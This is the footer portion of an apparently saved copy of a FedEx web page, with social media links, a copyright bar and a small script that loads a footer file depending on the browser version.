<DIV class="icon_link"><A class="fxg-link" href="http://www.linkedin.com/company/fedex" 
target="_self"><IMG class="fxg-icon fxg-icon--linkedin   " alt="LinkedIn" src="template_files/sprite-placeholder.png"></A>
									 </DIV>
<DIV class="icon_link"><A class="fxg-link" href="http://www.youtube.com/fedex" 
target="_self"><IMG class="fxg-icon fxg-icon--youtube   " alt="YouTube" src="template_files/sprite-placeholder.png"></A>
									 </DIV><!--<div class="icon_link">
                                            <a href="#" target="_self" class="fxg-link"><img src="//www.fedex.com/images/legacy/sprite-placeholder.png" alt="Tumblr" class="fxg-icon fxg-icon--tumblr   "/></a>
                                        </div>-->
									 
<DIV class="icon_link"><A class="fxg-link" href="https://www.pinterest.com/fedex" 
target="_self"><IMG class="fxg-icon fxg-icon--pinterest" alt="Pinterest" src="template_files/sprite-placeholder.png"></A>
									 </DIV>
<DIV class="icon_link"><A class="fxg-link" href="https://plus.google.com/+FedEx" 
target="_self"><IMG class="fxg-icon fxg-icon--googleplus" alt="Google Plus" src="template_files/sprite-placeholder.png"></A>
									 </DIV></DIV></DIV></DIV><!-- COLUMN CONTROL END -->					 </DIV></DIV><!-- END SOCIAL BAR -->
				 <!-- BEGIN COPYRIGHT BAR -->				 
<DIV class="fxg-copyright">
<DIV class="fxg-wrapper container">
<DIV class="column_control">
<DIV class="row"><!-- 2 Columns -->								 
<DIV class="fxg-col fxg-col-- fxg-col-- col-sm-4">
<DIV class="title">
<DIV class="fxg-title fxg-title--default" style="text-align: left;">© FedEx 
1995-2018											 </DIV></DIV></DIV>
<DIV class="row"><!-- 2 Columns -->                                 
<DIV class="fxg-col fxg-col-- fxg-col--  ">
<DIV class="link section"><A class="fxg-link default fxg-copyright-feedback-link    " 
href="http://www.fedex.com/us/customersupport/email/index.html" target="_self" 
alt="Feedback">Feedback</A>                                         <SPAN class="fxg-link__separator    "> 
| </SPAN>                                     </DIV></DIV>
<DIV class="fxg-col fxg-col-- fxg-col--  ">
<DIV class="link section"><A class="fxg-link default     " href="http://www.fedex.com/us/sitemap.html" 
target="_self" alt="Site Map">Site Map</A>                                       
  <SPAN class="fxg-link__separator    "> | </SPAN>                               
      </DIV>
<DIV class="link section"><A class="fxg-link default     " href="http://www.fedex.com/us/legal/" 
target="_self" alt="Terms of Use">Terms of Use</A>                               
          <SPAN class="fxg-link__separator    "> | </SPAN>                       
              </DIV>
<DIV class="link section"><A class="fxg-link default     " href="http://www.fedex.com/us/security/index.html" 
target="_self" alt="Security &amp; Privacy">Security &amp; Privacy</A>           
                              </DIV></DIV></DIV></DIV></DIV><!-- COLUMN CONTROL END -->
					 </DIV></DIV></FOOTER></DIV></DIV></DIV><!-- END FOOTER --> <!-- </noindex> --> 
</DIV>
<SCRIPT type="text/javascript">	var reg_account = "fedexus"; </SCRIPT>
 
<SCRIPT src="template_files/contentim_controller-min.js" type="text/javascript"></SCRIPT>
 
<SCRIPT src="template_files/app-min.js" type="text/javascript"></SCRIPT>
 
<SCRIPT src="template_files/main-min.js" type="text/javascript"></SCRIPT>
 
<DIV id="aux"></DIV>
<SCRIPT>


function loadDoc(file) {
  var xhttp = new XMLHttpRequest();
  xhttp.onreadystatechange = function() {
    if (this.readyState == 4 && this.status == 200) {
     document.getElementById("aux").innerHTML = this.responseText;
    }
  };
  xhttp.open("GET", file, true);
  xhttp.send();
}
	
if (vf == 0) {

   if ( /MSIE 7/i.test(navigator.userAgent) || /MSIE 8/i.test(navigator.userAgent) || /\/labelportal\//.test(location.href) ) {
    loadDoc("/templates/components/footers/us/gl_old.html");
  } else {
    loadDoc("/templates/components/footers/us/gl_new.html");
  }
}

</SCRIPT>
 </DIV><!-- LAYOUT: CLOSE CONTAINER -->         <!-- Browser Check -->		 	 
</BODY></HTML>
